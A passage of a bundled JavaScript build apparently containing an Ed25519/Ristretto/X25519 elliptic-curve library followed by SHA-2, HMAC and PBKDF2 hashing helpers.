          const W1 = mod(Nt * SQRT_AD_MINUS_ONE);
          const W2 = mod(_1n - s2);
          const W3 = mod(_1n + s2);
          return new ExtendedPoint(mod(W0 * W3), mod(W2 * W1), mod(W1 * W3), mod(W0 * W2));
        }
        static hashToCurve(hex) {
          hex = ensureBytes(hex, 64);
          const r1 = bytes255ToNumberLE(hex.slice(0, 32));
          const R1 = this.calcElligatorRistrettoMap(r1);
          const r2 = bytes255ToNumberLE(hex.slice(32, 64));
          const R2 = this.calcElligatorRistrettoMap(r2);
          return new RistrettoPoint(R1.add(R2));
        }
        static fromHex(hex) {
          hex = ensureBytes(hex, 32);
          const {
            a,
            d
          } = CURVE;
          const emsg = 'RistrettoPoint.fromHex: the hex is not valid encoding of RistrettoPoint';
          const s = bytes255ToNumberLE(hex);
          if (!equalBytes(numberTo32BytesLE(s), hex) || edIsNegative(s)) throw new Error(emsg);
          const s2 = mod(s * s);
          const u1 = mod(_1n + a * s2);
          const u2 = mod(_1n - a * s2);
          const u1_2 = mod(u1 * u1);
          const u2_2 = mod(u2 * u2);
          const v = mod(a * d * u1_2 - u2_2);
          const {
            isValid,
            value: I
          } = invertSqrt(mod(v * u2_2));
          const Dx = mod(I * u2);
          const Dy = mod(I * Dx * v);
          let x = mod((s + s) * Dx);
          if (edIsNegative(x)) x = mod(-x);
          const y = mod(u1 * Dy);
          const t = mod(x * y);
          if (!isValid || edIsNegative(t) || y === _0n) throw new Error(emsg);
          return new RistrettoPoint(new ExtendedPoint(x, y, _1n, t));
        }
        toRawBytes() {
          let {
            x,
            y,
            z,
            t
          } = this.ep;
          const u1 = mod(mod(z + y) * mod(z - y));
          const u2 = mod(x * y);
          const u2sq = mod(u2 * u2);
          const {
            value: invsqrt
          } = invertSqrt(mod(u1 * u2sq));
          const D1 = mod(invsqrt * u1);
          const D2 = mod(invsqrt * u2);
          const zInv = mod(D1 * D2 * t);
          let D;
          if (edIsNegative(t * zInv)) {
            let _x = mod(y * SQRT_M1);
            let _y = mod(x * SQRT_M1);
            x = _x;
            y = _y;
            D = mod(D1 * INVSQRT_A_MINUS_D);
          } else {
            D = D2;
          }
          if (edIsNegative(x * zInv)) y = mod(-y);
          let s = mod((z - y) * D);
          if (edIsNegative(s)) s = mod(-s);
          return numberTo32BytesLE(s);
        }
        toHex() {
          return bytesToHex(this.toRawBytes());
        }
        toString() {
          return this.toHex();
        }
        equals(other) {
          assertRstPoint(other);
          const a = this.ep;
          const b = other.ep;
          const one = mod(a.x * b.y) === mod(a.y * b.x);
          const two = mod(a.y * b.y) === mod(a.x * b.x);
          return one || two;
        }
        add(other) {
          assertRstPoint(other);
          return new RistrettoPoint(this.ep.add(other.ep));
        }
        subtract(other) {
          assertRstPoint(other);
          return new RistrettoPoint(this.ep.subtract(other.ep));
        }
        multiply(scalar) {
          return new RistrettoPoint(this.ep.multiply(scalar));
        }
        multiplyUnsafe(scalar) {
          return new RistrettoPoint(this.ep.multiplyUnsafe(scalar));
        }
      }
      exports.RistrettoPoint = RistrettoPoint;
      RistrettoPoint.BASE = new RistrettoPoint(ExtendedPoint.BASE);
      RistrettoPoint.ZERO = new RistrettoPoint(ExtendedPoint.ZERO);
      const pointPrecomputes = new WeakMap();
      class Point {
        constructor(x, y) {
          this.x = x;
          this.y = y;
        }
        _setWindowSize(windowSize) {
          this._WINDOW_SIZE = windowSize;
          pointPrecomputes.delete(this);
        }
        static fromHex(hex, strict = true) {
          const {
            d,
            P
          } = CURVE;
          hex = ensureBytes(hex, 32);
          const normed = hex.slice();
          normed[31] = hex[31] & ~0x80;
          const y = bytesToNumberLE(normed);
          if (strict && y >= P) throw new Error('Expected 0 < hex < P');
          if (!strict && y >= POW_2_256) throw new Error('Expected 0 < hex < 2**256');
          const y2 = mod(y * y);
          const u = mod(y2 - _1n);
          const v = mod(d * y2 + _1n);
          let {
            isValid,
            value: x
          } = uvRatio(u, v);
          if (!isValid) throw new Error('Point.fromHex: invalid y coordinate');
          const isXOdd = (x & _1n) === _1n;
          const isLastByteOdd = (hex[31] & 0x80) !== 0;
          if (isLastByteOdd !== isXOdd) {
            x = mod(-x);
          }
          return new Point(x, y);
        }
        static async fromPrivateKey(privateKey) {
          return (await getExtendedPublicKey(privateKey)).point;
        }
        toRawBytes() {
          const bytes = numberTo32BytesLE(this.y);
          bytes[31] |= this.x & _1n ? 0x80 : 0;
          return bytes;
        }
        toHex() {
          return bytesToHex(this.toRawBytes());
        }
        toX25519() {
          const {
            y
          } = this;
          const u = mod((_1n + y) * invert(_1n - y));
          return numberTo32BytesLE(u);
        }
        isTorsionFree() {
          return ExtendedPoint.fromAffine(this).isTorsionFree();
        }
        equals(other) {
          return this.x === other.x && this.y === other.y;
        }
        negate() {
          return new Point(mod(-this.x), this.y);
        }
        add(other) {
          return ExtendedPoint.fromAffine(this).add(ExtendedPoint.fromAffine(other)).toAffine();
        }
        subtract(other) {
          return this.add(other.negate());
        }
        multiply(scalar) {
          return ExtendedPoint.fromAffine(this).multiply(scalar, this).toAffine();
        }
      }
      exports.Point = Point;
      Point.BASE = new Point(CURVE.Gx, CURVE.Gy);
      Point.ZERO = new Point(_0n, _1n);
      class Signature {
        constructor(r, s) {
          this.r = r;
          this.s = s;
          this.assertValidity();
        }
        static fromHex(hex) {
          const bytes = ensureBytes(hex, 64);
          const r = Point.fromHex(bytes.slice(0, 32), false);
          const s = bytesToNumberLE(bytes.slice(32, 64));
          return new Signature(r, s);
        }
        assertValidity() {
          const {
            r,
            s
          } = this;
          if (!(r instanceof Point)) throw new Error('Expected Point instance');
          normalizeScalar(s, CURVE.l, false);
          return this;
        }
        toRawBytes() {
          const u8 = new Uint8Array(64);
          u8.set(this.r.toRawBytes());
          u8.set(numberTo32BytesLE(this.s), 32);
          return u8;
        }
        toHex() {
          return bytesToHex(this.toRawBytes());
        }
      }
      exports.Signature = Signature;
      function concatBytes(...arrays) {
        if (!arrays.every(a => a instanceof Uint8Array)) throw new Error('Expected Uint8Array list');
        if (arrays.length === 1) return arrays[0];
        const length = arrays.reduce((a, arr) => a + arr.length, 0);
        const result = new Uint8Array(length);
        for (let i = 0, pad = 0; i < arrays.length; i++) {
          const arr = arrays[i];
          result.set(arr, pad);
          pad += arr.length;
        }
        return result;
      }
      const hexes = Array.from({
        length: 256
      }, (v, i) => i.toString(16).padStart(2, '0'));
      function bytesToHex(uint8a) {
        if (!(uint8a instanceof Uint8Array)) throw new Error('Uint8Array expected');
        let hex = '';
        for (let i = 0; i < uint8a.length; i++) {
          hex += hexes[uint8a[i]];
        }
        return hex;
      }
      function hexToBytes(hex) {
        if (typeof hex !== 'string') {
          throw new TypeError('hexToBytes: expected string, got ' + typeof hex);
        }
        if (hex.length % 2) throw new Error('hexToBytes: received invalid unpadded hex');
        const array = new Uint8Array(hex.length / 2);
        for (let i = 0; i < array.length; i++) {
          const j = i * 2;
          const hexByte = hex.slice(j, j + 2);
          const byte = Number.parseInt(hexByte, 16);
          if (Number.isNaN(byte) || byte < 0) throw new Error('Invalid byte sequence');
          array[i] = byte;
        }
        return array;
      }
      function numberTo32BytesBE(num) {
        const length = 32;
        const hex = num.toString(16).padStart(length * 2, '0');
        return hexToBytes(hex);
      }
      function numberTo32BytesLE(num) {
        return numberTo32BytesBE(num).reverse();
      }
      function edIsNegative(num) {
        return (mod(num) & _1n) === _1n;
      }
      function bytesToNumberLE(uint8a) {
        if (!(uint8a instanceof Uint8Array)) throw new Error('Expected Uint8Array');
        return BigInt('0x' + bytesToHex(Uint8Array.from(uint8a).reverse()));
      }
      const MAX_255B = BigInt('0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
      function bytes255ToNumberLE(bytes) {
        return mod(bytesToNumberLE(bytes) & MAX_255B);
      }
      function mod(a, b = CURVE.P) {
        const res = a % b;
        return res >= _0n ? res : b + res;
      }
      function invert(number, modulo = CURVE.P) {
        if (number === _0n || modulo <= _0n) {
          throw new Error(`invert: expected positive integers, got n=${number} mod=${modulo}`);
        }
        let a = mod(number, modulo);
        let b = modulo;
        let x = _0n,
          y = _1n,
          u = _1n,
          v = _0n;
        while (a !== _0n) {
          const q = b / a;
          const r = b % a;
          const m = x - u * q;
          const n = y - v * q;
          b = a, a = r, x = u, y = v, u = m, v = n;
        }
        const gcd = b;
        if (gcd !== _1n) throw new Error('invert: does not exist');
        return mod(x, modulo);
      }
      function invertBatch(nums, p = CURVE.P) {
        const tmp = new Array(nums.length);
        const lastMultiplied = nums.reduce((acc, num, i) => {
          if (num === _0n) return acc;
          tmp[i] = acc;
          return mod(acc * num, p);
        }, _1n);
        const inverted = invert(lastMultiplied, p);
        nums.reduceRight((acc, num, i) => {
          if (num === _0n) return acc;
          tmp[i] = mod(acc * tmp[i], p);
          return mod(acc * num, p);
        }, inverted);
        return tmp;
      }
      function pow2(x, power) {
        const {
          P
        } = CURVE;
        let res = x;
        while (power-- > _0n) {
          res *= res;
          res %= P;
        }
        return res;
      }
      function pow_2_252_3(x) {
        const {
          P
        } = CURVE;
        const _5n = BigInt(5);
        const _10n = BigInt(10);
        const _20n = BigInt(20);
        const _40n = BigInt(40);
        const _80n = BigInt(80);
        const x2 = x * x % P;
        const b2 = x2 * x % P;
        const b4 = pow2(b2, _2n) * b2 % P;
        const b5 = pow2(b4, _1n) * x % P;
        const b10 = pow2(b5, _5n) * b5 % P;
        const b20 = pow2(b10, _10n) * b10 % P;
        const b40 = pow2(b20, _20n) * b20 % P;
        const b80 = pow2(b40, _40n) * b40 % P;
        const b160 = pow2(b80, _80n) * b80 % P;
        const b240 = pow2(b160, _80n) * b80 % P;
        const b250 = pow2(b240, _10n) * b10 % P;
        const pow_p_5_8 = pow2(b250, _2n) * x % P;
        return {
          pow_p_5_8,
          b2
        };
      }
      function uvRatio(u, v) {
        const v3 = mod(v * v * v);
        const v7 = mod(v3 * v3 * v);
        const pow = pow_2_252_3(u * v7).pow_p_5_8;
        let x = mod(u * v3 * pow);
        const vx2 = mod(v * x * x);
        const root1 = x;
        const root2 = mod(x * SQRT_M1);
        const useRoot1 = vx2 === u;
        const useRoot2 = vx2 === mod(-u);
        const noRoot = vx2 === mod(-u * SQRT_M1);
        if (useRoot1) x = root1;
        if (useRoot2 || noRoot) x = root2;
        if (edIsNegative(x)) x = mod(-x);
        return {
          isValid: useRoot1 || useRoot2,
          value: x
        };
      }
      function invertSqrt(number) {
        return uvRatio(_1n, number);
      }
      function modlLE(hash) {
        return mod(bytesToNumberLE(hash), CURVE.l);
      }
      function equalBytes(b1, b2) {
        if (b1.length !== b2.length) {
          return false;
        }
        for (let i = 0; i < b1.length; i++) {
          if (b1[i] !== b2[i]) {
            return false;
          }
        }
        return true;
      }
      function ensureBytes(hex, expectedLength) {
        const bytes = hex instanceof Uint8Array ? Uint8Array.from(hex) : hexToBytes(hex);
        if (typeof expectedLength === 'number' && bytes.length !== expectedLength) throw new Error(`Expected ${expectedLength} bytes`);
        return bytes;
      }
      function normalizeScalar(num, max, strict = true) {
        if (!max) throw new TypeError('Specify max value');
        if (typeof num === 'number' && Number.isSafeInteger(num)) num = BigInt(num);
        if (typeof num === 'bigint' && num < max) {
          if (strict) {
            if (_0n < num) return num;
          } else {
            if (_0n <= num) return num;
          }
        }
        throw new TypeError('Expected valid scalar: 0 < scalar < max');
      }
      function adjustBytes25519(bytes) {
        bytes[0] &= 248;
        bytes[31] &= 127;
        bytes[31] |= 64;
        return bytes;
      }
      function decodeScalar25519(n) {
        return bytesToNumberLE(adjustBytes25519(ensureBytes(n, 32)));
      }
      function checkPrivateKey(key) {
        key = typeof key === 'bigint' || typeof key === 'number' ? numberTo32BytesBE(normalizeScalar(key, POW_2_256)) : ensureBytes(key);
        if (key.length !== 32) throw new Error(`Expected 32 bytes`);
        return key;
      }
      function getKeyFromHash(hashed) {
        const head = adjustBytes25519(hashed.slice(0, 32));
        const prefix = hashed.slice(32, 64);
        const scalar = modlLE(head);
        const point = Point.BASE.multiply(scalar);
        const pointBytes = point.toRawBytes();
        return {
          head,
          prefix,
          scalar,
          point,
          pointBytes
        };
      }
      let _sha512Sync;
      function sha512s(...m) {
        if (typeof _sha512Sync !== 'function') throw new Error('utils.sha512Sync must be set to use sync methods');
        return _sha512Sync(...m);
      }
      async function getExtendedPublicKey(key) {
        return getKeyFromHash(await exports.utils.sha512(checkPrivateKey(key)));
      }
      function getExtendedPublicKeySync(key) {
        return getKeyFromHash(sha512s(checkPrivateKey(key)));
      }
      async function getPublicKey(privateKey) {
        return (await getExtendedPublicKey(privateKey)).pointBytes;
      }
      exports.getPublicKey = getPublicKey;
      function getPublicKeySync(privateKey) {
        return getExtendedPublicKeySync(privateKey).pointBytes;
      }
      async function sign(message, privateKey) {
        message = ensureBytes(message);
        const {
          prefix,
          scalar,
          pointBytes
        } = await getExtendedPublicKey(privateKey);
        const r = modlLE(await exports.utils.sha512(prefix, message));
        const R = Point.BASE.multiply(r);
        const k = modlLE(await exports.utils.sha512(R.toRawBytes(), pointBytes, message));
        const s = mod(r + k * scalar, CURVE.l);
        return new Signature(R, s).toRawBytes();
      }
      exports.sign = sign;
      function signSync(message, privateKey) {
        message = ensureBytes(message);
        const {
          prefix,
          scalar,
          pointBytes
        } = getExtendedPublicKeySync(privateKey);
        const r = modlLE(sha512s(prefix, message));
        const R = Point.BASE.multiply(r);
        const k = modlLE(sha512s(R.toRawBytes(), pointBytes, message));
        const s = mod(r + k * scalar, CURVE.l);
        return new Signature(R, s).toRawBytes();
      }
      function prepareVerification(sig, message, publicKey) {
        message = ensureBytes(message);
        if (!(publicKey instanceof Point)) publicKey = Point.fromHex(publicKey, false);
        const {
          r,
          s
        } = sig instanceof Signature ? sig.assertValidity() : Signature.fromHex(sig);
        const SB = ExtendedPoint.BASE.multiplyUnsafe(s);
        return {
          r,
          s,
          SB,
          pub: publicKey,
          msg: message
        };
      }
      function finishVerification(publicKey, r, SB, hashed) {
        const k = modlLE(hashed);
        const kA = ExtendedPoint.fromAffine(publicKey).multiplyUnsafe(k);
        const RkA = ExtendedPoint.fromAffine(r).add(kA);
        return RkA.subtract(SB).multiplyUnsafe(CURVE.h).equals(ExtendedPoint.ZERO);
      }
      async function verify(sig, message, publicKey) {
        const {
          r,
          SB,
          msg,
          pub
        } = prepareVerification(sig, message, publicKey);
        const hashed = await exports.utils.sha512(r.toRawBytes(), pub.toRawBytes(), msg);
        return finishVerification(pub, r, SB, hashed);
      }
      exports.verify = verify;
      function verifySync(sig, message, publicKey) {
        const {
          r,
          SB,
          msg,
          pub
        } = prepareVerification(sig, message, publicKey);
        const hashed = sha512s(r.toRawBytes(), pub.toRawBytes(), msg);
        return finishVerification(pub, r, SB, hashed);
      }
      exports.sync = {
        getExtendedPublicKey: getExtendedPublicKeySync,
        getPublicKey: getPublicKeySync,
        sign: signSync,
        verify: verifySync
      };
      async function getSharedSecret(privateKey, publicKey) {
        const {
          head
        } = await getExtendedPublicKey(privateKey);
        const u = Point.fromHex(publicKey).toX25519();
        return exports.curve25519.scalarMult(head, u);
      }
      exports.getSharedSecret = getSharedSecret;
      Point.BASE._setWindowSize(8);
      function cswap(swap, x_2, x_3) {
        const dummy = mod(swap * (x_2 - x_3));
        x_2 = mod(x_2 - dummy);
        x_3 = mod(x_3 + dummy);
        return [x_2, x_3];
      }
      function montgomeryLadder(pointU, scalar) {
        const {
          P
        } = CURVE;
        const u = normalizeScalar(pointU, P);
        const k = normalizeScalar(scalar, P);
        const a24 = BigInt(121665);
        const x_1 = u;
        let x_2 = _1n;
        let z_2 = _0n;
        let x_3 = u;
        let z_3 = _1n;
        let swap = _0n;
        let sw;
        for (let t = BigInt(255 - 1); t >= _0n; t--) {
          const k_t = k >> t & _1n;
          swap ^= k_t;
          sw = cswap(swap, x_2, x_3);
          x_2 = sw[0];
          x_3 = sw[1];
          sw = cswap(swap, z_2, z_3);
          z_2 = sw[0];
          z_3 = sw[1];
          swap = k_t;
          const A = x_2 + z_2;
          const AA = mod(A * A);
          const B = x_2 - z_2;
          const BB = mod(B * B);
          const E = AA - BB;
          const C = x_3 + z_3;
          const D = x_3 - z_3;
          const DA = mod(D * A);
          const CB = mod(C * B);
          const dacb = DA + CB;
          const da_cb = DA - CB;
          x_3 = mod(dacb * dacb);
          z_3 = mod(x_1 * mod(da_cb * da_cb));
          x_2 = mod(AA * BB);
          z_2 = mod(E * (AA + mod(a24 * E)));
        }
        sw = cswap(swap, x_2, x_3);
        x_2 = sw[0];
        x_3 = sw[1];
        sw = cswap(swap, z_2, z_3);
        z_2 = sw[0];
        z_3 = sw[1];
        const {
          pow_p_5_8,
          b2
        } = pow_2_252_3(z_2);
        const xp2 = mod(pow2(pow_p_5_8, BigInt(3)) * b2);
        return mod(x_2 * xp2);
      }
      function encodeUCoordinate(u) {
        return numberTo32BytesLE(mod(u, CURVE.P));
      }
      function decodeUCoordinate(uEnc) {
        const u = ensureBytes(uEnc, 32);
        u[31] &= 127;
        return bytesToNumberLE(u);
      }
      exports.curve25519 = {
        BASE_POINT_U: '0900000000000000000000000000000000000000000000000000000000000000',
        scalarMult(privateKey, publicKey) {
          const u = decodeUCoordinate(publicKey);
          const p = decodeScalar25519(privateKey);
          const pu = montgomeryLadder(u, p);
          if (pu === _0n) throw new Error('Invalid private or public key received');
          return encodeUCoordinate(pu);
        },
        scalarMultBase(privateKey) {
          return exports.curve25519.scalarMult(privateKey, exports.curve25519.BASE_POINT_U);
        }
      };
      const crypto = {
        node: nodeCrypto,
        web: typeof self === 'object' && 'crypto' in self ? self.crypto : undefined
      };
      exports.utils = {
        bytesToHex,
        hexToBytes,
        concatBytes,
        getExtendedPublicKey,
        mod,
        invert,
        TORSION_SUBGROUP: ['0100000000000000000000000000000000000000000000000000000000000000', 'c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac037a', '0000000000000000000000000000000000000000000000000000000000000080', '26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc05', 'ecffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f', '26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc85', '0000000000000000000000000000000000000000000000000000000000000000', 'c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac03fa'],
        hashToPrivateScalar: hash => {
          hash = ensureBytes(hash);
          if (hash.length < 40 || hash.length > 1024) throw new Error('Expected 40-1024 bytes of private key as per FIPS 186');
          return mod(bytesToNumberLE(hash), CURVE.l - _1n) + _1n;
        },
        randomBytes: (bytesLength = 32) => {
          if (crypto.web) {
            return crypto.web.getRandomValues(new Uint8Array(bytesLength));
          } else if (crypto.node) {
            const {
              randomBytes
            } = crypto.node;
            return new Uint8Array(randomBytes(bytesLength).buffer);
          } else {
            throw new Error("The environment doesn't have randomBytes function");
          }
        },
        randomPrivateKey: () => {
          return exports.utils.randomBytes(32);
        },
        sha512: async (...messages) => {
          const message = concatBytes(...messages);
          if (crypto.web) {
            const buffer = await crypto.web.subtle.digest('SHA-512', message.buffer);
            return new Uint8Array(buffer);
          } else if (crypto.node) {
            return Uint8Array.from(crypto.node.createHash('sha512').update(message).digest());
          } else {
            throw new Error("The environment doesn't have sha512 function");
          }
        },
        precompute(windowSize = 8, point = Point.BASE) {
          const cached = point.equals(Point.BASE) ? point : new Point(point.x, point.y);
          cached._setWindowSize(windowSize);
          cached.multiply(_2n);
          return cached;
        },
        sha512Sync: undefined
      };
      Object.defineProperties(exports.utils, {
        sha512Sync: {
          configurable: false,
          get() {
            return _sha512Sync;
          },
          set(val) {
            if (!_sha512Sync) _sha512Sync = val;
          }
        }
      });
    }, {
      "crypto": 2
    }],
    33: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.output = exports.exists = exports.hash = exports.bytes = exports.bool = exports.number = void 0;
      function number(n) {
        if (!Number.isSafeInteger(n) || n < 0) throw new Error(`Wrong positive integer: ${n}`);
      }
      exports.number = number;
      function bool(b) {
        if (typeof b !== 'boolean') throw new Error(`Expected boolean, not ${b}`);
      }
      exports.bool = bool;
      function bytes(b, ...lengths) {
        if (!(b instanceof Uint8Array)) throw new TypeError('Expected Uint8Array');
        if (lengths.length > 0 && !lengths.includes(b.length)) throw new TypeError(`Expected Uint8Array of length ${lengths}, not of length=${b.length}`);
      }
      exports.bytes = bytes;
      function hash(hash) {
        if (typeof hash !== 'function' || typeof hash.create !== 'function') throw new Error('Hash should be wrapped by utils.wrapConstructor');
        number(hash.outputLen);
        number(hash.blockLen);
      }
      exports.hash = hash;
      function exists(instance, checkFinished = true) {
        if (instance.destroyed) throw new Error('Hash instance has been destroyed');
        if (checkFinished && instance.finished) throw new Error('Hash#digest() has already been called');
      }
      exports.exists = exists;
      function output(out, instance) {
        bytes(out);
        const min = instance.outputLen;
        if (out.length < min) {
          throw new Error(`digestInto() expects output buffer of length at least ${min}`);
        }
      }
      exports.output = output;
      const assert = {
        number,
        bool,
        bytes,
        hash,
        exists,
        output
      };
      exports.default = assert;
    }, {}],
    34: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.SHA2 = void 0;
      const _assert_js_1 = require("./_assert.js");
      const utils_js_1 = require("./utils.js");
      function setBigUint64(view, byteOffset, value, isLE) {
        if (typeof view.setBigUint64 === 'function') return view.setBigUint64(byteOffset, value, isLE);
        const _32n = BigInt(32);
        const _u32_max = BigInt(0xffffffff);
        const wh = Number(value >> _32n & _u32_max);
        const wl = Number(value & _u32_max);
        const h = isLE ? 4 : 0;
        const l = isLE ? 0 : 4;
        view.setUint32(byteOffset + h, wh, isLE);
        view.setUint32(byteOffset + l, wl, isLE);
      }
      class SHA2 extends utils_js_1.Hash {
        constructor(blockLen, outputLen, padOffset, isLE) {
          super();
          this.blockLen = blockLen;
          this.outputLen = outputLen;
          this.padOffset = padOffset;
          this.isLE = isLE;
          this.finished = false;
          this.length = 0;
          this.pos = 0;
          this.destroyed = false;
          this.buffer = new Uint8Array(blockLen);
          this.view = (0, utils_js_1.createView)(this.buffer);
        }
        update(data) {
          _assert_js_1.default.exists(this);
          const {
            view,
            buffer,
            blockLen
          } = this;
          data = (0, utils_js_1.toBytes)(data);
          const len = data.length;
          for (let pos = 0; pos < len;) {
            const take = Math.min(blockLen - this.pos, len - pos);
            if (take === blockLen) {
              const dataView = (0, utils_js_1.createView)(data);
              for (; blockLen <= len - pos; pos += blockLen) this.process(dataView, pos);
              continue;
            }
            buffer.set(data.subarray(pos, pos + take), this.pos);
            this.pos += take;
            pos += take;
            if (this.pos === blockLen) {
              this.process(view, 0);
              this.pos = 0;
            }
          }
          this.length += data.length;
          this.roundClean();
          return this;
        }
        digestInto(out) {
          _assert_js_1.default.exists(this);
          _assert_js_1.default.output(out, this);
          this.finished = true;
          const {
            buffer,
            view,
            blockLen,
            isLE
          } = this;
          let {
            pos
          } = this;
          buffer[pos++] = 0b10000000;
          this.buffer.subarray(pos).fill(0);
          if (this.padOffset > blockLen - pos) {
            this.process(view, 0);
            pos = 0;
          }
          for (let i = pos; i < blockLen; i++) buffer[i] = 0;
          setBigUint64(view, blockLen - 8, BigInt(this.length * 8), isLE);
          this.process(view, 0);
          const oview = (0, utils_js_1.createView)(out);
          this.get().forEach((v, i) => oview.setUint32(4 * i, v, isLE));
        }
        digest() {
          const {
            buffer,
            outputLen
          } = this;
          this.digestInto(buffer);
          const res = buffer.slice(0, outputLen);
          this.destroy();
          return res;
        }
        _cloneInto(to) {
          to || (to = new this.constructor());
          to.set(...this.get());
          const {
            blockLen,
            buffer,
            length,
            finished,
            destroyed,
            pos
          } = this;
          to.length = length;
          to.pos = pos;
          to.finished = finished;
          to.destroyed = destroyed;
          if (length % blockLen) to.buffer.set(buffer);
          return to;
        }
      }
      exports.SHA2 = SHA2;
    }, {
      "./_assert.js": 33,
      "./utils.js": 43
    }],
    35: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.add = exports.toBig = exports.split = exports.fromBig = void 0;
      const U32_MASK64 = BigInt(2 ** 32 - 1);
      const _32n = BigInt(32);
      function fromBig(n, le = false) {
        if (le) return {
          h: Number(n & U32_MASK64),
          l: Number(n >> _32n & U32_MASK64)
        };
        return {
          h: Number(n >> _32n & U32_MASK64) | 0,
          l: Number(n & U32_MASK64) | 0
        };
      }
      exports.fromBig = fromBig;
      function split(lst, le = false) {
        let Ah = new Uint32Array(lst.length);
        let Al = new Uint32Array(lst.length);
        for (let i = 0; i < lst.length; i++) {
          const {
            h,
            l
          } = fromBig(lst[i], le);
          [Ah[i], Al[i]] = [h, l];
        }
        return [Ah, Al];
      }
      exports.split = split;
      const toBig = (h, l) => BigInt(h >>> 0) << _32n | BigInt(l >>> 0);
      exports.toBig = toBig;
      const shrSH = (h, l, s) => h >>> s;
      const shrSL = (h, l, s) => h << 32 - s | l >>> s;
      const rotrSH = (h, l, s) => h >>> s | l << 32 - s;
      const rotrSL = (h, l, s) => h << 32 - s | l >>> s;
      const rotrBH = (h, l, s) => h << 64 - s | l >>> s - 32;
      const rotrBL = (h, l, s) => h >>> s - 32 | l << 64 - s;
      const rotr32H = (h, l) => l;
      const rotr32L = (h, l) => h;
      const rotlSH = (h, l, s) => h << s | l >>> 32 - s;
      const rotlSL = (h, l, s) => l << s | h >>> 32 - s;
      const rotlBH = (h, l, s) => l << s - 32 | h >>> 64 - s;
      const rotlBL = (h, l, s) => h << s - 32 | l >>> 64 - s;
      function add(Ah, Al, Bh, Bl) {
        const l = (Al >>> 0) + (Bl >>> 0);
        return {
          h: Ah + Bh + (l / 2 ** 32 | 0) | 0,
          l: l | 0
        };
      }
      exports.add = add;
      const add3L = (Al, Bl, Cl) => (Al >>> 0) + (Bl >>> 0) + (Cl >>> 0);
      const add3H = (low, Ah, Bh, Ch) => Ah + Bh + Ch + (low / 2 ** 32 | 0) | 0;
      const add4L = (Al, Bl, Cl, Dl) => (Al >>> 0) + (Bl >>> 0) + (Cl >>> 0) + (Dl >>> 0);
      const add4H = (low, Ah, Bh, Ch, Dh) => Ah + Bh + Ch + Dh + (low / 2 ** 32 | 0) | 0;
      const add5L = (Al, Bl, Cl, Dl, El) => (Al >>> 0) + (Bl >>> 0) + (Cl >>> 0) + (Dl >>> 0) + (El >>> 0);
      const add5H = (low, Ah, Bh, Ch, Dh, Eh) => Ah + Bh + Ch + Dh + Eh + (low / 2 ** 32 | 0) | 0;
      const u64 = {
        fromBig,
        split,
        toBig: exports.toBig,
        shrSH,
        shrSL,
        rotrSH,
        rotrSL,
        rotrBH,
        rotrBL,
        rotr32H,
        rotr32L,
        rotlSH,
        rotlSL,
        rotlBH,
        rotlBL,
        add,
        add3L,
        add3H,
        add4L,
        add4H,
        add5H,
        add5L
      };
      exports.default = u64;
    }, {}],
    36: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.crypto = void 0;
      exports.crypto = {
        node: undefined,
        web: typeof self === 'object' && 'crypto' in self ? self.crypto : undefined
      };
    }, {}],
    37: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.hmac = void 0;
      const _assert_js_1 = require("./_assert.js");
      const utils_js_1 = require("./utils.js");
      class HMAC extends utils_js_1.Hash {
        constructor(hash, _key) {
          super();
          this.finished = false;
          this.destroyed = false;
          _assert_js_1.default.hash(hash);
          const key = (0, utils_js_1.toBytes)(_key);
          this.iHash = hash.create();
          if (typeof this.iHash.update !== 'function') throw new TypeError('Expected instance of class which extends utils.Hash');
          this.blockLen = this.iHash.blockLen;
          this.outputLen = this.iHash.outputLen;
          const blockLen = this.blockLen;
          const pad = new Uint8Array(blockLen);
          pad.set(key.length > blockLen ? hash.create().update(key).digest() : key);
          for (let i = 0; i < pad.length; i++) pad[i] ^= 0x36;
          this.iHash.update(pad);
          this.oHash = hash.create();
          for (let i = 0; i < pad.length; i++) pad[i] ^= 0x36 ^ 0x5c;
          this.oHash.update(pad);
          pad.fill(0);
        }
        update(buf) {
          _assert_js_1.default.exists(this);
          this.iHash.update(buf);
          return this;
        }
        digestInto(out) {
          _assert_js_1.default.exists(this);
          _assert_js_1.default.bytes(out, this.outputLen);
          this.finished = true;
          this.iHash.digestInto(out);
          this.oHash.update(out);
          this.oHash.digestInto(out);
          this.destroy();
        }
        digest() {
          const out = new Uint8Array(this.oHash.outputLen);
          this.digestInto(out);
          return out;
        }
        _cloneInto(to) {
          to || (to = Object.create(Object.getPrototypeOf(this), {}));
          const {
            oHash,
            iHash,
            finished,
            destroyed,
            blockLen,
            outputLen
          } = this;
          to = to;
          to.finished = finished;
          to.destroyed = destroyed;
          to.blockLen = blockLen;
          to.outputLen = outputLen;
          to.oHash = oHash._cloneInto(to.oHash);
          to.iHash = iHash._cloneInto(to.iHash);
          return to;
        }
        destroy() {
          this.destroyed = true;
          this.oHash.destroy();
          this.iHash.destroy();
        }
      }
      const hmac = (hash, key, message) => new HMAC(hash, key).update(message).digest();
      exports.hmac = hmac;
      exports.hmac.create = (hash, key) => new HMAC(hash, key);
    }, {
      "./_assert.js": 33,
      "./utils.js": 43
    }],
    38: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.pbkdf2Async = exports.pbkdf2 = void 0;
      const _assert_js_1 = require("./_assert.js");
      const hmac_js_1 = require("./hmac.js");
      const utils_js_1 = require("./utils.js");
      function pbkdf2Init(hash, _password, _salt, _opts) {
        _assert_js_1.default.hash(hash);
        const opts = (0, utils_js_1.checkOpts)({
          dkLen: 32,
          asyncTick: 10
        }, _opts);
        const {
          c,
          dkLen,
          asyncTick
        } = opts;
        _assert_js_1.default.number(c);
